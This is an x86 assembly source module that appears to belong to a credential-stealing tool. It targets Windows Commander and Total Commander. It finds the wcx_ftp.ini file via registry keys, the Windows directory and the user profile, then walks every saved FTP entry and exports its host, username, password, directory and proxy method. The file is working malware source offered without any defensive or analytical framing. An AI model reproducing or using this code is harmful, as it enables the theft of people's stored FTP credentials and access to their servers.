; Windows / Total Commander
; Tested on:
;	Windows Commander v4.52
;	Total Commander v6.03

.data
	@AllocStr	<szWTCPath1>,		<"Software\Ghisler\Windows Commander">
	@AllocStr	<szWTCPath2>,		<"Software\Ghisler\Total Commander">
	@AllocStr	<szWTCValue>,		<"InstallDir">
	@AllocStr	<szWTCValue2>,		<"FtpIniName">
	@AllocStr	<szWTCIni>,		<"\wcx_ftp.ini">
	@AllocStr	<szWTCIniStr1>,		<"host">
	@AllocStr	<szWTCIniStr2>,		<"username">
	@AllocStr	<szWTCIniStr3>,		<"password">
	@AllocStr	<szWTCIniStr4>,		<"directory">
	@AllocStr	<szWTCIniStr5>,		<"method">
	@AllocMem	<lpWTCPath>,		<MAX_PATH+1>
	@AllocMem	<lpWTCSections>, 	<8192>
	@AllocMem	<lpWTCParam>,		<MAX_PATH+1>

.code

GetWTCParam proc lpKey, dwType: DWORD
	invoke  GetPrivateProfileString, edi, lpKey, offset szNilStr, offset lpWTCParam, MAX_PATH, offset lpWTCPath
	.IF	eax
		invoke	ExportStr, dwType, 0, offset lpWTCParam
	.ENDIF
	ret
GetWTCParam endp

GetWTCPass proc uses edi
	invoke	StrStrI, offset lpWTCPath, offset szWTCIni
	.IF	!eax 
		invoke	lstrcat, offset lpWTCPath, offset szWTCIni
	.ENDIF  
	
	mov	edi, offset lpWTCSections
	
        invoke  GetPrivateProfileSectionNames, edi, 8190, offset lpWTCPath
        test	eax, eax
        jz	@ret        
               
@l:
	invoke	GetWTCParam, offset szWTCIniStr1, SUBTYPE_WTC_HOST
	invoke	GetWTCParam, offset szWTCIniStr2, SUBTYPE_WTC_USER
	invoke	GetWTCParam, offset szWTCIniStr3, SUBTYPE_WTC_PASS
	invoke	GetWTCParam, offset szWTCIniStr4, SUBTYPE_WTC_DIR
	invoke	GetWTCParam, offset szWTCIniStr5, SUBTYPE_WTC_PROXY
	@Next	@l

@ret:	
	ret
GetWTCPass endp

GetWTCPassFromReg proc hkKey, szPath: DWORD
	LOCAL	dwBufSize: DWORD
	
	mov	dwBufSize, MAX_PATH
	invoke	RegReadValue, hkKey, szPath, offset szWTCValue, offset lpWTCPath, addr dwBufSize
	.IF	eax
		invoke	GetWTCPass	
	.ENDIF
	
	mov	dwBufSize, MAX_PATH
	invoke	RegReadValue, hkKey, szPath, offset szWTCValue2, offset lpWTCPath, addr dwBufSize
	.IF	eax
		invoke	GetWTCPass	
	.ENDIF	
	ret
GetWTCPassFromReg endp

GetWTCOutput proc
	; Write header
	invoke	ExportModule, MODULE_WTC
	
	; Ini file path in windows dir
	invoke	GetWindowsDirectory, offset lpWTCPath, MAX_PATH
	invoke	GetWTCPass
	
	; C:\Documents and Settings\username\wcx_ftp.ini
	.IF	dwSHGetFolderPath
		push	offset lpWTCPath
		push	0
		push	NULL
		push	CSIDL_PROFILE
		push	NULL
		call	dwSHGetFolderPath
		.IF	eax == S_OK
			invoke	GetWTCPass
		.ENDIF
	.ENDIF

	; Ini file path in registry
	invoke  GetWTCPassFromReg, HKEY_CURRENT_USER, offset szWTCPath1
	invoke  GetWTCPassFromReg, HKEY_CURRENT_USER, offset szWTCPath2
	invoke  GetWTCPassFromReg, HKEY_LOCAL_MACHINE, offset szWTCPath1
	invoke  GetWTCPassFromReg, HKEY_LOCAL_MACHINE, offset szWTCPath2

	ret
GetWTCOutput endp